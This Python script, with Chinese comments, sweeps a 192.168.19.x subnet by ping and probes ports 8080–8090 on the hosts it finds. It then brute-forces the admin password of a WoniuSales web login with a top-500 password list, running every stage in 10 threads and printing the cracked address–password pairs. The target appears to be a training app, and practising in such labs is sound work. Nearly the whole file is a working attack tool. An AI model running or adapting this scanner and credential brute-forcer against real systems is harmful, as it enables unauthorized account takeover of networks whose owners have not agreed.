import subprocess
import threading
import socket
import requests
import csv


class SCAN_WONIUSALES:
    available_ip = []  # 存放可用ip
    available_host = []  # 存放可用ip加端口
    available_password = {}  # 存放地址和密码键值对

    def ip_scan(self, ip_range):
        """IP扫描,以12.xxx 内局域网为范围"""
        for ip in ip_range:
            ip_to_check = f"192.168.19.{ip}"
            cmd = f'ping -n 2 -w 1000 {ip_to_check}'  # cmd命令，展示两行，超时1秒
            cmd_result = subprocess.getoutput(cmd)
            if "请求超时" not in cmd_result:
                self.available_ip.append(ip_to_check)  # 存储可用ip
                print(f"可用的ip---->{ip_to_check}")

    def port_scan(self, ip):
        """端口扫描,范围8080-8090"""
        for port in range(8080, 8091):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # socket 专门测端口链接
            s.settimeout(1)  # 设置超时时间1秒
            try:
                s.connect((ip, port))
                s.close()
                host = ip + ":" + str(port)  # 把ip和端口拼起来
                self.available_host.append(host)  # 拼起来的地址放入列表存储
                print(f"可用的ip{ip}和端口{port}")
            except socket.error:
                pass

    def scan_woniu_password(self, pwds):
        """用requests库来爆破密码正确性"""
        s = requests.session()
        for addr in self.available_host:
            for pwd in pwds:
                url = f"http://{addr}/woniusales2/user/login"  # 登录API 一定不要错了!,扫不到就试试woniusales2
                try:
                    login = s.post(url=url, data={"username": "admin", "password": pwd[0],  # 密码取0位，因为是列表套列表
                                                  "verifycode": "11xx"})
                    if "login-pass" in login.json()["msg"] or "vcode-error" in login.json()["msg"]:  # 1.4和2.0版本验证码不同
                        print(f"可登录的地址{addr},密码是{pwd[0]}")
                        self.available_password[addr] = pwd[0]  # 放入字典
                except Exception:
                    pass

    def start_scan(self):
        thread = 10  # 线程数,不要超过ip,端口,和密码的数量
        ip_slice = len(range(2, 255)) // thread  # 切片
        ip_list = list(range(2, 255))  # 设置一个列表
        threads = []

        for i in range(thread):
            if i != (thread - 1):
                ip_range = ip_list[i * ip_slice:(i + 1) * ip_slice]  # 第一个线程是0位， 取0位到切片数的这一段
            else:
                ip_range = ip_list[i * ip_slice:]  # 如果是最后一个线程，就把剩下的都拿了

            t = threading.Thread(target=self.ip_scan, args=(ip_range,))  # 启动线程放入 参数列表，上面函数要循环的去拿
            threads.append(t)

        for t in threads:
            t.start()

        for t in threads:  # 等待线程结束
            t.join()

        """"开始处理端口"""
        threads = []
        for ip in self.available_ip:
            t = threading.Thread(target=self.port_scan, args=(ip,))
            threads.append(t)

        for t in threads:
            t.start()

        for t in threads:  # 等待线程结束
            t.join()

        """开始处理密码"""
        threads = []
        with open("../files/top500.txt", "r", encoding="utf8") as file:
            passwords = list(csv.reader(file))  # 获取到猜测密码的列表套列表格式
            pwd_slice = len(passwords) // thread  # 切片

            for i in range(thread):
                if i != (thread - 1):
                    pwds = passwords[i * pwd_slice:(i + 1) * pwd_slice]  # 注意pwds出来是列表套列表
                else:
                    pwds = passwords[i * pwd_slice:]

                t = threading.Thread(target=self.scan_woniu_password, args=(pwds,))
                threads.append(t)

        for t in threads:
            t.start()

        for t in threads:
            t.join()

        # 以下是报告展示
        print(f"线程结束展示报告".center(70, "*"))
        print(f"可用的ip--------->{self.available_ip}")
        print(f"可用的端口-------->{self.available_host}")
        print(f"可用地址和密码合集----->{self.available_password}")


if __name__ == '__main__':
    s = SCAN_WONIUSALES()
    s.start_scan()
